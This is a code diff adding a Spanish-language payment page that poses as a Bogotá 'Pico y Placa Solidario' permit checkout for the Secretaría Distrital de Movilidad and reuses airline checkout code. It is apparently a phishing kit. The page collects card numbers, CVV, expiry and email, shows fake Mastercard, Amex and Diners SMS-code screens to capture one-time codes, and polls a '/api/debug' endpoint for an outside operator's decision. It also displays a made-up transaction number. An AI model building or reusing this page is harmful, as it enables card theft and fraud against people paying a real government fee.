+        <input id="otp-amex" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingrese su código" autocomplete="one-time-code" />
+        <button type="submit">Enviar</button>
+      </form>
+    </div>
+  </section>
+
+  <!-- Mastercard ID Check -->
+  <section class="pasarela-card" data-challenge-brand="mastercard" hidden>
+    <div class="pasarela-card__body">
+      <header class="pasarela-card__brand-center">
+        <div class="pasarela-card__mc-id">
+          <svg viewBox="0 0 62 38" width="56" height="34" aria-hidden="true">
+            <circle cx="23" cy="19" r="15" fill="#EB001B"></circle>
+            <circle cx="39" cy="19" r="15" fill="#F79E1B"></circle>
+            <path fill="#FF5F00" d="M31 6.6a15 15 0 0 1 0 24.8 15 15 0 0 1 0-24.8Z"></path>
+          </svg>
+          <span><em>mastercard</em> <strong>ID Check</strong></span>
+        </div>
+      </header>
+      <h2 class="pasarela-card__title">Autorización del Pago</h2>
+      <div class="pasarela-card__msg">
+        <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
+        <p>Enviado a su número registrado en el banco.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
+          <p>Monto: <strong data-challenge-amount>COP 0</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp" data-otp-form>
+        <label for="otp-mc">Ingrese el código enviado por SMS a su celular</label>
+        <input id="otp-mc" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingrese su código" autocomplete="one-time-code" />
+        <button type="submit">Enviar</button>
+      </form>
+    </div>
+  </section>
+
+  <!-- Diners -->
+  <section class="pasarela-card pasarela-card--wide" data-challenge-brand="diners" hidden>
+    <div class="pasarela-card__body">
+      <header class="pasarela-card__brand-row">
+        <img src="/images/pasarela/diners.png" alt="Diners Club" class="pasarela-card__logo-diners" />
+        <img src="/images/pasarela/visa.png" alt="Visa" class="pasarela-card__logo-visa-sm" />
+      </header>
+      <h2 class="pasarela-card__title pasarela-card__title--diners">Autenticación de compra</h2>
+      <div class="pasarela-card__diners-grid">
+        <div class="pasarela-card__msg pasarela-card__msg--plain">
+          <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
+          <p>Enviado a su número registrado en el banco.</p>
+          <div class="pasarela-card__box pasarela-card__box--plain">
+            <p>Estás autorizando el pago a <strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
+            <p>Monto: <strong data-challenge-amount>COP 0</strong></p>
+            <p>Fecha: <span data-challenge-datetime></span></p>
+          </div>
+        </div>
+        <form class="pasarela-otp pasarela-otp--pill" data-otp-form>
+          <label for="otp-diners">Ingrese el código enviado por SMS a su celular</label>
+          <input id="otp-diners" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingrese su código" autocomplete="one-time-code" />
+          <button type="submit">Enviar</button>
+        </form>
+      </div>
+    </div>
+  </section>
+</div>
+
+<div class="pagos-sheet" id="pagos-sheet" hidden>
+  <button type="button" class="pagos-sheet__backdrop" data-pagos-sheet-close aria-label="Cerrar"></button>
+  <div class="pagos-sheet__panel" role="dialog" aria-modal="true" aria-labelledby="pagos-sheet-title">
+    <header class="pagos-sheet__head">
+      <h3 id="pagos-sheet-title">Detalle de tu compra</h3>
+      <button type="button" class="pagos-sheet__close" data-pagos-sheet-close aria-label="Cerrar">×</button>
+    </header>
+    <div class="pagos-sheet__body" id="pagos-sheet-body"></div>
+  </div>
+</div>
+
+<script>
+  import {
+    cardNumberMaxLength,
+    detectCardBrand,
+    formatCardExp,
+    formatCardNumber,
+    onlyDigits,
+    validateCardExp,
+    validateCardNumber,
+  } from '../../services/cardPaymentValidation';
+
+  const boardEl = document.getElementById('pagos-board');
+  const legsJson = boardEl?.dataset.legs || '[]';
+  const copy = JSON.parse(boardEl?.dataset.copy || '{}');
+  const discountPct = Number(boardEl?.dataset.descuento || 0) || 0;
+
+  const STORAGE_KEY = 'latam-checkout-selection';
+  const SEATS_KEY = 'latam-seat-selection';
+  const STORE_KEY = 'latam-store-selection';
+  const PAX_KEY = 'latam-passenger-draft';
+  const DEBUG_SESSION_KEY = 'latam-debug-session-id';
+  const defaultLegs = JSON.parse(legsJson);
+
+  function debugSessionId() {
+    let sessionId = sessionStorage.getItem(DEBUG_SESSION_KEY);
+    if (!sessionId) {
+      sessionId = crypto.randomUUID();
+      sessionStorage.setItem(DEBUG_SESSION_KEY, sessionId);
+    }
+    return sessionId;
+  }
+
+  async function sendDebugEvent(event, payload = {}) {
+    console.log(`[debug-before-fetch:${event}]`, {
+      sessionId: debugSessionId(),
+      route: window.location.pathname,
+      ...payload,
+    });
+    const response = await fetch('/api/debug', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        event,
+        sessionId: debugSessionId(),
+        route: window.location.pathname,
+        ...payload,
+      }),
+    });
+    if (!response.ok) throw new Error('No se pudo consultar el enrutador debug');
+    return response.json();
+  }
+
+  async function pollDebugDecision(timeoutMs = 90000) {
+    const sessionId = debugSessionId();
+    const started = Date.now();
+    while (Date.now() - started < timeoutMs) {
+      const response = await fetch(`/api/debug?sessionId=${encodeURIComponent(sessionId)}`, {
+        headers: { Accept: 'application/json' },
+      });
+      if (response.ok) {
+        const payload = await response.json();
+        const decision = payload?.decision || {};
+        if (decision.action && decision.action !== 'wait') return decision;
+      }
+      await new Promise((resolve) => window.setTimeout(resolve, 1500));
+    }
+    return {
+      action: 'timeout',
+      message: 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.',
+    };
+  }
+
+  function maskCard(value) {
+    const digits = onlyDigits(value || '');
+    if (digits.length < 8) return digits.replace(/\d/g, '*');
+    return `${digits.slice(0, 6)}******${digits.slice(-4)}`;
+  }
+
+  function setUiMessage(message, kind = 'error') {
+    if (!msg) return;
+    msg.hidden = !message;
+    msg.textContent = message || '';
+    msg.dataset.kind = kind;
+  }
+
+  function setChallengeMessage(brand, message, kind = 'error') {
+    const challenge = document.getElementById('pagos-challenge-screen');
+    const panel = challenge?.querySelector(`[data-challenge-brand="${brand}"]`);
+    const form = panel?.querySelector('[data-otp-form]');
+    if (!form) {
+      setUiMessage(message, kind);
+      return;
+    }
+    let error = form.querySelector('[data-otp-debug-message]');
+    if (!error) {
+      error = document.createElement('p');
+      error.setAttribute('data-otp-debug-message', '');
+      error.setAttribute('role', 'alert');
+      error.style.margin = '10px 0 0';
+      error.style.fontSize = '13px';
+      error.style.lineHeight = '1.35';
+      form.appendChild(error);
+    }
+    error.textContent = message || '';
+    error.hidden = !message;
+    error.dataset.kind = kind;
+    error.style.color = kind === 'success' ? '#178a3b' : kind === 'info' ? '#1b4e9b' : '#b42318';
+  }
+
+  function clearChallengeMessages() {
+    document.querySelectorAll('[data-otp-debug-message]').forEach((el) => {
+      el.textContent = '';
+      el.hidden = true;
+    });
+  }
+
+  function clearCardInputs() {
+    [cardNumber, cardName, cardExp, cardCvv, cardEmail].forEach((input) => {
+      if (!input) return;
+      input.value = '';
+      input.setAttribute('readonly', '');
+      syncPlaceholderState(input);
+    });
+    syncCardFieldStates({ force: false });
+    syncPayEnabled();
+  }
+
+  function showCardErrorModal(message = 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.') {
+    const modal = document.getElementById('pagos-debug-modal');
+    const text = document.getElementById('pagos-debug-modal-message');
+    const close = document.getElementById('pagos-debug-modal-close');
+    if (text) text.textContent = message;
+    if (modal) modal.hidden = false;
+    document.body.classList.add('pagos-debug-modal-open');
+    close?.focus();
+  }
+
+  function closeCardErrorModal() {
+    const modal = document.getElementById('pagos-debug-modal');
+    if (modal) modal.hidden = true;
+    document.body.classList.remove('pagos-debug-modal-open');
+    cardNumber?.focus();
+  }
+
+  document.getElementById('pagos-debug-modal-close')?.addEventListener('click', closeCardErrorModal);
+
+  function showChallenge(brand, merchantLabel, amountLabel, datetimeLabel, withError = '') {
+    const challenge = document.getElementById('pagos-challenge-screen');
+    const brandKey = ['visa', 'amex', 'diners', 'mastercard', 'discover'].includes(brand) ? brand : 'visa';
+    clearChallengeMessages();
+    challenge?.querySelectorAll('[data-challenge-brand]').forEach((panel) => {
+      const active = panel.getAttribute('data-challenge-brand') === brandKey;
+      panel.hidden = !active;
+      if (!active) return;
+      panel.querySelectorAll('[data-challenge-merchant]').forEach((el) => {
+        el.textContent = merchantLabel;
+      });
+      panel.querySelectorAll('[data-challenge-amount]').forEach((el) => {
+        el.textContent = amountLabel;
+      });
+      panel.querySelectorAll('[data-challenge-datetime]').forEach((el) => {
+        el.textContent = datetimeLabel;
+      });
+      const form = panel.querySelector('[data-otp-form]');
+      if (form) form.dataset.attempts = '0';
+      const input = panel.querySelector('input[name="otp"]');
+      if (input) input.value = '';
+    });
+    if (challenge) challenge.hidden = false;
+    if (withError) setChallengeMessage(brandKey, withError);
+  }
+
+  function money(value, withUsd = false) {
+    const formatted = Math.round(Number(value || 0)).toLocaleString('es-CO');
+    return withUsd ? `COP\u00a0${formatted}` : `$${formatted}`;
+  }
+
+  function ticketAfterDiscount(original) {
+    const base = Number(original) || 0;
+    if (!(discountPct > 0)) return Math.round(base * 100) / 100;
+    return Math.round(base * (1 - Math.min(100, discountPct) / 100) * 100) / 100;
+  }
+
+  function ticketMoney(original, withUsd = false) {
+    const before = Number(original) || 0;
+    if (!(discountPct > 0)) return money(before, withUsd);
+    return `<span class="ticket-price"><span class="ticket-price__was">${money(before, withUsd)}</span><span class="ticket-price__now">${money(ticketAfterDiscount(before), withUsd)}</span></span>`;
+  }
+
+  function totalMoney(before, after, withUsd = false) {
+    if (!(discountPct > 0) || Math.abs(before - after) < 0.005) return money(after, withUsd);
+    return `<span class="ticket-price"><span class="ticket-price__was">${money(before, withUsd)}</span><span class="ticket-price__now">${money(after, withUsd)}</span></span>`;
+  }
+
+  function readJson(key, fallback) {
+    try {
+      return JSON.parse(sessionStorage.getItem(key) || 'null') ?? fallback;
+    } catch {
+      return fallback;
+    }
+  }
+
+  function peopleLabel(selection) {
+    const adults = Math.max(1, Number(selection?.adults || 1));
+    const children = Number(selection?.children || 0);
+    const infants = Number(selection?.infants || 0);
+    const parts = [];
+    parts.push(`${adults} Adulto${adults === 1 ? '' : 's'}`);
+    if (children) parts.push(`${children} Niño${children === 1 ? '' : 's'}`);
+    if (infants) parts.push(`${infants} Infante${infants === 1 ? '' : 's'}`);
+    return parts.join(', ');
+  }
+
+  function formatShortDate(iso) {
+    if (!iso) return '';
+    const d = new Date(`${iso}T12:00:00`);
+    if (Number.isNaN(d.getTime())) return iso;
+    const days = ['dom', 'lun', 'mar', 'mié', 'jue', 'vie', 'sáb'];
+    const months = ['ene', 'feb', 'mar', 'abr', 'may', 'jun', 'jul', 'ago', 'sept', 'oct', 'nov', 'dic'];
+    return `${days[d.getDay()]}, ${d.getDate()} ${months[d.getMonth()]}`;
+  }
+
+  function buildLegs(selection) {
+    if (!selection?.outbound?.flight) return defaultLegs;
+    const out = selection.outbound.flight;
+    const legs = [
+      {
+        title: `De ${selection.from?.city || 'Origen'} a ${selection.to?.city || 'Destino'}`,
+        dateLabel: formatShortDate(selection.departDate) || defaultLegs[0].dateLabel,
+        depart: out.depart || '',
+        arrive: out.arrive || '',
+        fromCode: selection.from?.code || '',
+        toCode: selection.to?.code || '',
+        brand: selection.outbound?.brandName || selection.outbound?.brand || 'Full',
+      },
+    ];
+    if (selection.trip === 'roundtrip' && selection.inbound?.flight) {
+      const back = selection.inbound.flight;
+      legs.push({
+        title: `De ${selection.to?.city || 'Destino'} a ${selection.from?.city || 'Origen'}`,
+        dateLabel: formatShortDate(selection.returnDate) || defaultLegs[1]?.dateLabel || '',
+        depart: back.depart || '',
+        arrive: back.arrive || '',
+        fromCode: selection.to?.code || '',
+        toCode: selection.from?.code || '',
+        brand: selection.inbound?.brandName || selection.inbound?.brand || 'Full',
+      });
+    }
+    return legs;
+  }
+
+  function tripBase(selection, discounted = true) {
+    const people = Math.max(1, (selection?.adults || 0) + (selection?.children || 0) + (selection?.infants || 0));
+    const outRaw = Number(selection?.outbound?.price || 0);
+    const backRaw = selection?.trip === 'roundtrip' ? Number(selection?.inbound?.price || 0) : 0;
+    const out = discounted ? ticketAfterDiscount(outRaw) : outRaw;
+    const back = discounted ? ticketAfterDiscount(backRaw) : backRaw;
+    return (out + back) * people;
+  }
+
+  function seatExtras(seats) {
+    return Number(seats?.outbound?.price || 0) + Number(seats?.inbound?.price || 0);
+  }
+
+  function bagExtras(store) {
+    const hold = Number(store?.holdCount || 0) * 45;
+    const special = Number(store?.specialCount || 0) * 35;
+    const cabin = store?.cabin === 'cabin-plus' ? 25 : 0;
+    const car = store?.selectedCarId ? Number(store?.selectedCarPrice || 0) : 0;
+    return hold + special + cabin + car;
+  }
+
+  function computeTotal(selection, seats, store, pax, discounted = true) {
+    return tripBase(selection, discounted) + seatExtras(seats) + bagExtras(store) + Number(pax?.assistPrice || 0);
+  }
+
+  function renderLegs(legs) {
+    const root = document.getElementById('pagos-legs');
+    if (!root) return;
+    root.innerHTML = legs
+      .map(
+        (leg) => `
+      <li class="pagos-leg">
+        <p class="pagos-leg__title">${leg.title}</p>
+        <p class="pagos-leg__date">${leg.dateLabel}</p>
+        <p class="pagos-leg__times">
+          <span class="pagos-leg__dep">${leg.depart} ${leg.fromCode}</span>
+          <i class="pagos-leg__arrow" aria-hidden="true">
+            <svg viewBox="0 0 32 32" width="10" height="10"><path fill="currentColor" d="M13.55 4.45L23.4025 14.25L2 14.25L2 17.75L23.4025 17.75L13.55 27.55L16 30L30 16L16 2L13.55 4.45Z"/></svg>
+          </i>
+          <span class="pagos-leg__arr">${leg.arrive} ${leg.toCode}</span>
+        </p>
+        <div class="pagos-leg__brand-wrap">
+          <span class="pagos-leg__brand">${leg.brand}</span>
+        </div>
+      </li>
+    `,
+      )
+      .join('');
+  }
+
+  function renderDetail(selection, seats, store, pax, totalBefore, total) {
+    const body = document.getElementById('pagos-sheet-body');
+    if (!body) return;
+    const current = permitFromQuery();
+    body.innerHTML = `
+      <p><strong>Permiso</strong> · ${current.label}</p>
+      <p><strong>Placa</strong> · ${current.placa || '—'}</p>
+      <p class="pagos-sheet__total"><strong>Total</strong> · ${totalMoney(totalBefore, total, true)}</p>
+    `;
+  }
+
+  function permitFromQuery() {
+    const q = new URLSearchParams(window.location.search);
+    const tipo = String(q.get('tipoPermiso') || q.get('duracion') || 'diario').toLowerCase();
+    const placa = String(q.get('placa') || '').toUpperCase();
+    const cilindraje = String(q.get('cilindraje') || '');
+    const combustible = String(q.get('combustible') || '').toUpperCase();
+    const modelo = String(q.get('modelo') || '');
+    const avaluo = String(q.get('avaluo') || '');
+    const municipio = String(q.get('municipio') || '');
+    const labels = {
+      diario: 'Permiso diario',
+      mensual: 'Permiso mensual',
+      semestral: 'Permiso semestral',
+      '1': 'Permiso diario',
+      '2': 'Permiso mensual',
+      '3': 'Permiso semestral',
+    };
+    const board = document.getElementById('pagos-board');
+    const price = Number(board?.getAttribute('data-pico-tarifa') || '0');
+    return {
+      tipo,
+      placa,
+      label: labels[tipo] || 'Permiso Pico y Placa Solidario',
+      price,
+    };
+  }
+
+  function renderPermitSummary(permit) {
+    const root = document.getElementById('pagos-legs');
+    if (!root) return;
+    const placa = permit.placa || '—';
+    root.innerHTML = `
+      <li class="pagos-leg">
+        <p class="pagos-leg__title">${permit.label}</p>
+        <p class="pagos-leg__date">Placa ${placa}</p>
+        <p class="pagos-leg__times">Pico y Placa Solidario · Bogotá D.C.</p>
+      </li>
+    `;
+  }
+
+  const selection = readJson(STORAGE_KEY, null);
+  const seats = readJson(SEATS_KEY, {});
+  const store = readJson(STORE_KEY, {});
+  const pax = readJson(PAX_KEY, {});
+  const permit = permitFromQuery();
+  const totalBefore = permit.price;
+  const total = ticketAfterDiscount(permit.price);
+
+  renderPermitSummary(permit);
+  renderDetail(selection || {}, seats, store, pax, totalBefore, total);
+
+  const priceEl = document.getElementById('pagos-total-price');
+  const paxEl = document.getElementById('pagos-pax-label');
+  const payBtn = document.getElementById('pagos-pay');
+  const terms = document.getElementById('pagos-terms');
+  const email = document.getElementById('pagos-email');
+  const addCard = document.getElementById('pagos-add-card');
+  const addCardToggle = document.getElementById('pagos-add-card-toggle');
+  const cardForm = document.getElementById('pagos-card-form');
+  const cardAmount = document.getElementById('pagos-card-amount');
+  const invoiceToggle = document.getElementById('pagos-invoice-toggle');
+  const invoicePanel = document.getElementById('pagos-invoice-panel');
+  const invoiceBox = document.getElementById('pagos-invoice');
+  const invoiceConfirm = document.getElementById('pagos-invoice-confirm');
+  const sheet = document.getElementById('pagos-sheet');
+  const msg = document.getElementById('pagos-msg');
+  const walletLogin = document.getElementById('pagos-wallet-login');
+  const walletMsg = document.getElementById('pagos-wallet-msg');
+  const cardEmail = document.getElementById('pagos-card-email');
+  const cardNumber = document.getElementById('pagos-card-number');
+  const cardName = document.getElementById('pagos-card-name');
+  const cardExp = document.getElementById('pagos-card-exp');
+  const cardCvvWrap = document.getElementById('pagos-card-cvv-wrap');
+  const cardCvv = document.getElementById('pagos-card-cvv');
+  const cardBrandEl = document.getElementById('pagos-card-brand');
+  const cardNumberBox = document.getElementById('pagos-card-number-box');
+  const cardNumberOk = document.getElementById('pagos-card-number-ok');
+  const cardNumberField = document.getElementById('pagos-card-number-field');
+  const cardNumberError = document.getElementById('pagos-card-number-error');
+  const cardNameError = document.getElementById('pagos-card-name-error');
+  const cardExpError = document.getElementById('pagos-card-exp-error');
+  const cardCvvError = document.getElementById('pagos-card-cvv-error');
+  const cardEmailError = document.getElementById('pagos-card-email-error');
+
+  if (priceEl) priceEl.textContent = money(total);
+  const tablaValor = document.getElementById('pico-tabla-valor');
+  if (tablaValor) tablaValor.textContent = money(total);
+  if (cardAmount) cardAmount.textContent = money(total);
+  if (paxEl) paxEl.textContent = permit.placa ? `${permit.label} · Placa ${permit.placa}` : permit.label;
+  if (payBtn) payBtn.textContent = `${copy.payPrefix} ${money(total)}`;
+  if (email && pax?.email) email.value = pax.email;
+  const cusEl = document.getElementById('pico-cus');
+  if (cusEl) cusEl.textContent = String(100000000 + Math.floor(Math.random() * 899999999));
+
+  function isValidEmail(value) {
+    const v = String(value || '').trim();
+    return v.includes('@') && v.indexOf('@') > 0 && v.indexOf('@') < v.length - 1;
+  }
+
+  function syncEmailValidity(input) {
+    if (!input) return;
+    const v = input.value.trim();
+    const invalid = Boolean(v) && !isValidEmail(v);
+    input.setCustomValidity(invalid ? 'Ingresa un correo que incluya @' : '');
+    input.classList.toggle('is-invalid', invalid);
+    input.closest('.pagos-field')?.classList.toggle('is-invalid', invalid);
+  }
+
+  function validateCardName(value) {
+    const name = String(value || '').trim();
+    if (!name) return { valid: false, incomplete: true, message: '' };
+    if (name.length < 2) {
+      return { valid: false, incomplete: false, message: 'Ingresa el nombre como aparece en la tarjeta' };
+    }
+    return { valid: true, incomplete: false, message: '' };
+  }
+
+  function validateCardCvv(value, brand) {
+    const digits = onlyDigits(value);
+    const len = brand.cvvLength;
+    if (!digits) return { valid: false, incomplete: true, message: '' };
+    if (digits.length < len) {
+      return { valid: false, incomplete: true, message: `Ingresa los ${len} dígitos del CVV` };
+    }
+    if (digits.length !== len) {
+      return { valid: false, incomplete: false, message: 'CVV inválido' };
+    }
+    return { valid: true, incomplete: false, message: '' };
+  }
+
+  function isCardPaymentValid() {
+    const number = validateCardNumber(cardNumber?.value || '');
+    const name = validateCardName(cardName?.value || '');
+    const exp = validateCardExp(cardExp?.value || '');
+    const cvv = validateCardCvv(cardCvv?.value || '', number.brand);
+    return Boolean(number.valid && name.valid && exp.valid && cvv.valid);
+  }
+
+  function syncPayEnabled() {
+    const receiptOk = isValidEmail(email?.value);
+    const cardOpen = addCardToggle?.getAttribute('aria-expanded') === 'true';
+    const cardEmailOk = isValidEmail(cardEmail?.value);
+    const cardFieldsOk = isCardPaymentValid();
+    const ok = Boolean(terms?.checked && receiptOk && cardOpen && cardEmailOk && cardFieldsOk);
+    if (payBtn) payBtn.disabled = !ok;
+  }
+
+  terms?.addEventListener('change', syncPayEnabled);
+  email?.addEventListener('input', () => {
+    if (cardEmail) cardEmail.value = email.value;
+    syncEmailValidity(email);
+    syncPayEnabled();
+  });
+  email?.addEventListener('blur', () => syncEmailValidity(email));
+  syncPayEnabled();
+
+  function setCardOpen(open) {
+    if (!addCard || !addCardToggle || !cardForm) return;
+    addCard.classList.toggle('is-selected', open);
+    addCardToggle.setAttribute('aria-expanded', open ? 'true' : 'false');
+    addCardToggle.setAttribute('aria-pressed', open ? 'true' : 'false');
+    cardForm.hidden = !open;
+    if (open) syncCardFieldStates();
+    else syncPayEnabled();
+  }
+
+  if (addCardToggle) {
+    addCardToggle.onclick = () => {
+      if (addCardToggle.getAttribute('aria-expanded') === 'true') return;
+      setCardOpen(true);
+    };
+    setCardOpen(true);
+  }
+
+  const correoQuery = new URLSearchParams(window.location.search).get('correo');
+  if (email && !email.value && correoQuery) {
+    email.value = correoQuery;
+    syncEmailValidity(email);
+  }
+  if (cardEmail && email?.value) cardEmail.value = email.value;
+
+  function setFormattedValue(input, formatted) {
+    if (!input) return;
+    const start = input.selectionStart;
+    const prev = input.value;
+    input.value = formatted;
+    if (typeof start === 'number' && document.activeElement === input) {
+      const diff = formatted.length - prev.length;
+      const next = Math.max(0, start + diff);
+      try {
+        input.setSelectionRange(next, next);
+      } catch {
+        /* ignore */
+      }
+    }
+  }
+
+  function setFieldError(input, errorEl, message, { valid = false, showError = false } = {}) {
+    if (!input) return;
+    const hasError = Boolean(showError && message);
+    input.classList.toggle('is-invalid', hasError);
+    input.classList.toggle('is-valid', Boolean(valid) && !hasError);
+    input.setAttribute('aria-invalid', hasError ? 'true' : 'false');
+    if (errorEl) {
+      errorEl.hidden = !hasError;
+      errorEl.textContent = hasError ? message : '';
+    }
+  }
+
+  function currentBrand() {
+    return detectCardBrand(cardNumber?.value || '');
+  }
+
+  function syncBrandUi(brand, numberValid = false) {
+    if (cardNumber) cardNumber.maxLength = cardNumberMaxLength(brand);
+    if (cardCvv) cardCvv.maxLength = brand.cvvLength;
+
+    const showBrand = brand.brand !== 'unknown' && Boolean(brand.label);
+    if (cardBrandEl) {
+      cardBrandEl.hidden = !showBrand;
+      cardBrandEl.dataset.brand = brand.brand;
+      cardBrandEl.querySelectorAll('[data-brand-logo]').forEach((logo) => {
+        logo.hidden = logo.getAttribute('data-brand-logo') !== brand.brand;
+      });
+    }
+
+    cardNumberBox?.classList.toggle('has-brand', showBrand);
+    cardNumberBox?.classList.toggle('is-valid', Boolean(numberValid));
+    if (cardNumberBox) cardNumberBox.dataset.brand = showBrand ? brand.brand : '';
+    cardNumberField?.classList.toggle('has-brand', showBrand);
+    cardNumberField?.classList.toggle('is-filled', onlyDigits(cardNumber?.value || '').length > 0);
+
+    if (cardNumberOk) {
+      cardNumberOk.hidden = !numberValid;
+    }
+  }
+
+  function cardReadyForCvv() {
+    const number = validateCardNumber(cardNumber?.value || '');
+    const hasNumber = onlyDigits(cardNumber?.value || '').length >= number.brand.length;
+    const hasName = String(cardName?.value || '').trim().length >= 2;
+    const hasExp = onlyDigits(cardExp?.value || '').length === 4;
+    return hasNumber && hasName && hasExp;
+  }
+
+  function syncCardCvvVisibility() {
+    if (!cardCvvWrap) return;
+    const show = cardReadyForCvv();
+    const wasHidden = cardCvvWrap.hidden;
+    cardCvvWrap.hidden = !show;
+    if (show && wasHidden) cardCvv?.focus();
+    if (!show && cardCvv) {
+      cardCvv.value = '';
+      setFieldError(cardCvv, cardCvvError, '', {});
+    }
+  }
+
+  function syncCardFieldStates(opts = {}) {
+    const force = Boolean(opts.force);
+    const number = validateCardNumber(cardNumber?.value || '');
+    const name = validateCardName(cardName?.value || '');
+    const exp = validateCardExp(cardExp?.value || '');
+    const cvv = validateCardCvv(cardCvv?.value || '', number.brand);
+
+    syncBrandUi(number.brand, number.valid);
+
+    setFieldError(cardNumber, cardNumberError, number.message, {
+      valid: number.valid,
+      showError: force || (!number.incomplete && Boolean(number.message)),
+    });
+    cardNumberBox?.classList.toggle('is-invalid', Boolean(
+      (force || (!number.incomplete && Boolean(number.message))) && number.message,
+    ));
+    setFieldError(cardName, cardNameError, name.message, {
+      valid: name.valid,
+      showError: force || (!name.incomplete && Boolean(name.message)),
+    });
+    setFieldError(cardExp, cardExpError, exp.message, {
+      valid: exp.valid,
+      showError: force || (!exp.incomplete && Boolean(exp.message)),
+    });
+
+    if (!cardCvvWrap?.hidden) {
+      setFieldError(cardCvv, cardCvvError, cvv.message, {
+        valid: cvv.valid,
+        showError: force || (!cvv.incomplete && Boolean(cvv.message)),
+      });
+    }
+
+    syncCardCvvVisibility();
+    syncPayEnabled();
+  }
+
+  function syncCardEmailError() {
+    if (!cardEmail) return;
+    const v = cardEmail.value.trim();
+    const invalid = Boolean(v) && !isValidEmail(v);
+    const empty = !v;
+    setFieldError(cardEmail, cardEmailError, invalid ? 'Ingresa un correo que incluya @' : '', {
+      valid: !empty && !invalid,
+      showError: invalid,
+    });
+  }
+
+  cardNumber?.addEventListener('focus', () => cardNumber.removeAttribute('readonly'));
+  cardName?.addEventListener('focus', () => cardName.removeAttribute('readonly'));
+  cardExp?.addEventListener('focus', () => cardExp.removeAttribute('readonly'));
+  cardCvv?.addEventListener('focus', () => cardCvv.removeAttribute('readonly'));
+  cardEmail?.addEventListener('focus', () => cardEmail.removeAttribute('readonly'));
+
+  function syncPlaceholderState(input) {
+    input?.closest('.pagos-card-input')?.classList.toggle(
+      'has-value',
+      Boolean(String(input?.value || '').trim()),
+    );
+  }
+
+  let binLookupTimer = 0;
+  let lastBinQuery = '';
+
+  function scheduleBinLookup() {
+    const digits = onlyDigits(cardNumber?.value || '');
+    if (digits.length < 6) {
+      window.clearTimeout(binLookupTimer);
+      lastBinQuery = '';
+      return;
+    }
+    const bin = digits.slice(0, 6);
+    if (bin === lastBinQuery) return;
+    window.clearTimeout(binLookupTimer);
+    binLookupTimer = window.setTimeout(async () => {
+      lastBinQuery = bin;
+      try {
+        await fetch(`/api/bin?bin=${encodeURIComponent(bin)}`);
+      } catch {
+        /* ignore */
+      }
+    }, 400);
+  }
+
+  cardNumber?.addEventListener('input', () => {
+    const brand = detectCardBrand(cardNumber.value);
+    setFormattedValue(cardNumber, formatCardNumber(cardNumber.value, brand));
+    syncCardFieldStates();
+    scheduleBinLookup();
+  });
+  cardNumber?.addEventListener('blur', () => {
+    const brand = detectCardBrand(cardNumber.value);
+    setFormattedValue(cardNumber, formatCardNumber(cardNumber.value, brand));
+    syncCardFieldStates({ force: true });
+  });
+  cardName?.addEventListener('input', () => {
+    cardName.value = String(cardName.value || '').replace(/\d/g, '');
+    syncPlaceholderState(cardName);
+    syncCardFieldStates();
+  });
+  cardName?.addEventListener('blur', () => syncCardFieldStates({ force: true }));
+  cardExp?.addEventListener('input', () => {
+    setFormattedValue(cardExp, formatCardExp(cardExp.value));
+    syncPlaceholderState(cardExp);
+    syncCardFieldStates();
+  });
+  cardExp?.addEventListener('blur', () => {
+    setFormattedValue(cardExp, formatCardExp(cardExp.value));
+    syncCardFieldStates({ force: true });
+  });
+  cardCvv?.addEventListener('input', () => {
+    const brand = currentBrand();
+    cardCvv.value = onlyDigits(cardCvv.value).slice(0, brand.cvvLength);
+    syncPlaceholderState(cardCvv);
+    syncCardFieldStates();
+  });
+  cardCvv?.addEventListener('blur', () => syncCardFieldStates({ force: true }));
+  cardEmail?.addEventListener('input', () => {
+    syncPlaceholderState(cardEmail);
+    syncEmailValidity(cardEmail);
+    syncCardEmailError();
+    syncPayEnabled();
+  });
+  cardEmail?.addEventListener('blur', () => {
+    syncEmailValidity(cardEmail);
+    syncCardEmailError();
+  });
+  syncPlaceholderState(cardName);
+  syncPlaceholderState(cardExp);
+  syncPlaceholderState(cardCvv);
+  syncPlaceholderState(cardEmail);
+  syncCardFieldStates();
+
+  if (walletLogin) {
+    walletLogin.onclick = () => {
+      if (!walletMsg) return;
+      walletMsg.hidden = false;
+      walletMsg.textContent = copy.walletUnavailable;
+    };
+  }
+
+  function setInvoiceOpen(on) {
+    if (!invoiceToggle) return;
+    invoiceToggle.setAttribute('aria-checked', on ? 'true' : 'false');
+    invoiceToggle.classList.toggle('is-on', on);
+    invoiceBox?.classList.toggle('is-on', on);
+    if (invoicePanel) invoicePanel.hidden = !on;
+    if (!on && invoiceConfirm) invoiceConfirm.checked = false;
+  }
+
+  if (invoiceToggle) {
+    invoiceToggle.onclick = (event) => {
+      event.stopPropagation();
+      const on = invoiceToggle.getAttribute('aria-checked') !== 'true';
+      setInvoiceOpen(on);
+    };
+  }
+
+  function setSheet(open) {
+    if (!sheet) return;
+    sheet.hidden = !open;
+    sheet.classList.toggle('is-open', open);
+    document.body.classList.toggle('pagos-sheet-open', open);
+  }
+
+  document.getElementById('pagos-detail-toggle')?.addEventListener('click', () => setSheet(true));
+  sheet?.querySelectorAll('[data-pagos-sheet-close]').forEach((el) => el.addEventListener('click', () => setSheet(false)));
+
+  payBtn?.addEventListener('click', async () => {
+    if (payBtn.disabled || payBtn.classList.contains('is-loading')) return;
+    const wait = document.getElementById('pagos-wait-screen');
+    const challenge = document.getElementById('pagos-challenge-screen');
+    const brand = detectCardBrand(cardNumber?.value || '').brand;
+    let brandKey = ['visa', 'amex', 'diners', 'mastercard', 'discover'].includes(brand)
+      ? brand
+      : 'visa';
+    const now = new Date();
+    const months = [
+      'enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio',
+      'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre',
+    ];
+    const dateLabel = `${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()}`;
